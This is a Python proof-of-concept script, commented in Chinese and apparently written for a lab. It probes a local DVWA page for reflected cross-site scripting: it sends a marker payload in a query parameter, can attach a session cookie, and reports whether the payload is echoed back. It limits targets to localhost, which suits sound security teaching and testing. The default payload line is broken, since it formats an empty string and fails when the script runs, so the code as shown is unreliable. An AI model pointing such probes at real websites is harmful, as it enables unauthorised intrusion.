poc.code: #!/usr/bin/env python3 # -*- coding: utf-8 -*- """XSS-002 反射型 XSS 教学验证草案（仅限本地授权靶场，使用无害标记）。""" import argparse import sys import urllib.error import urllib.parse import urllib.request ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"} DEFAULT_PAYLOAD = '' % repr("LLM_LAB_XSS") class NoRedirect(urllib.request.HTTPRedirectHandler): """拒绝自动跟随重定向，便于区分登录失效与目标页面。""" def redirect_request(self, req, fp, code, msg, headers, newurl): return None def build_parser(): parser = argparse.ArgumentParser(description="XSS-002 reflected XSS draft") parser.add_argument("--base-url", default="http://127.0.0.1/dvwa/vulnerabilities/xss_r/") parser.add_argument("--param", default="name") parser.add_argument("--payload", default=DEFAULT_PAYLOAD) parser.add_argument("--timeout", type=float, default=10.0) parser.add_argument("--cookie-file", default=None, help="optional local file holding the Cookie header value; never printed") return parser def validate_target(base_url): parts = urllib.parse.urlsplit(base_url) if parts.scheme not in ("http", "https"): raise SystemExit("unsupported scheme: %s" % parts.scheme) if (parts.hostname or "").lower() not in ALLOWED_HOSTS: raise SystemExit("host not allowed: %s" % parts.hostname) def main(): args = build_parser().parse_args() validate_target(args.base_url) query = urllib.parse.urlencode({args.param: args.payload}) separator = "&" if urllib.parse.urlsplit(args.base_url).query else "?" url = args.base_url + separator + query request = urllib.request.Request(url, method="GET") request.add_header("User-Agent", "LLM-LAB-XSS-002-draft") if args.cookie_file: with open(args.cookie_file, "r", encoding="utf-8") as handle: request.add_header("Cookie", handle.read().strip()) opener = urllib.request.build_opener(NoRedirect) try: with opener.open(request, timeout=args.timeout) as response: body = response.read().decode("utf-8", errors="replace") print("status:", response.getcode()) print("content-type:", response.headers.get("Content-Type")) print("payload echoed verbatim:", args.payload in body) index = body.find(args.payload) if index >= 0: start = max(0, index - 40) print("echo context:", body[start:index + len(args.payload) + 40]) except urllib.error.HTTPError as exc: print("HTTP error (possible login redirect/denial):", exc.code) return 2 except urllib.error.URLError as exc: print("connection error:", exc.reason) return 3 return 0 if __name__ == "__main__": sys.exit(main())
